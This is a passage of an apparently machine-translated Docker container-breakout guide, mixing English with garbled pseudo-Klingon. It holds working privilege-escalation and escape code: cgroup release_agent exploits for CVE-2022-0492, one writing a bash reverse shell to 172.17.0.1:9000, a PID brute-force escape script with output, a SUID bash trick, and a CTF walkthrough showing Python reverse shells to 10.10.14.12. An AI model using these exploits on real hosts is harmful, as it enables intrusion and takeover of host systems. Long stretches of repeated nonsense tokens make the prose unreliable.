'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'no
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### Privileged Escape Abusing created release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="Second PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

**tlhIngan Hol:**

**QapHa'** **ghItlh** **'e'** **yIqaw**:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### **Privileged Escape** **release\_agent** **ghItlh** **relative path** **jatlh** - **PoC3**

**exploits** **previous** **absolute path** **container** **host filesystem** **jatlh** **DIvI'**. **However**, **qaStaHvIS** **absolute path** **container** **host** **jatlh** **DIvI'** **jatlh** **vaj** **DIvI'** **yIlo'** **technique** **vaj**:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
PoC-чIwI' vItlhutlhlaHchugh vItlhutlh. vItlhutlhlaHchugh PoC-чIwI' vItlhutlhlaHchugh vItlhutlh.
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Privileged Escape Abusing Sensitive Mounts

**QIb** **qawHaq** **qarDaq** **qo'noS** **DIvI'**. **chay'** **qarDaq** **qo'noS** **DIvI'** **'e'** **qarDaq** **qo'noS** **DIvI'** **'e'** **'e'** **(ghaH 'e'** **qarDaq** **qo'noS** **DIvI'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Privilege Escalation with 2 shells and host mount

If you have access as **root inside a container** that has some folder from the host mounted and you have **escaped as a non privileged user to the host** and have read access over the mounted folder.\
You can create a **bash suid file** in the **mounted folder** inside the **container** and **execute it from the host** to privesc.

### qo' vItlhutlh

**root inside a container** vItlhutlh **ghaH** 'ej **host mounted** vItlhutlh **folder** vaj **escaped as a non privileged user to the host** 'ej **mounted folder** vItlhutlh **read access** 'e' vaj.\
**bash suid file** vItlhutlh **mounted folder** vaj **container** vItlhutlh **create** 'ej **execute it from the host** to privesc.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Privilege Escalation with 2 shells

If you have access as **root inside a container** and you have **escaped as a non privileged user to the host**, you can abuse both shells to **privesc inside the host** if you have the capability MKNOD inside the container (it's by default) as [**explained in this post**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
With such capability the root user within the container is allowed to **create block device files**. Device files are special files that are used to **access underlying hardware & kernel modules**. For example, the /dev/sda block device file gives access to **read the raw data on the systems disk**.

Docker safeguards against block device misuse within containers by enforcing a cgroup policy that **blocks block device read/write operations**. Nevertheless, if a block device is **created inside the container**, it becomes accessible from outside the container via the **/proc/PID/root/** directory. This access requires the **process owner to be the same** both inside and outside the container.

**Exploitation** example from this [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

**hostPID** (host process ID) is a feature in Docker that allows a container to access the processes running on the host system. By enabling this feature, a container can gain access to sensitive information stored in those processes. This can be a significant security risk as it can lead to privilege escalation and unauthorized access to sensitive data.

To test the security of your Docker setup and check if the **hostPID** feature is enabled, you can set up a test lab environment.
```
docker run --rm -it --pid=host ubuntu bash
```
Qatlh 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 'ej 'oH 'e' yImev. 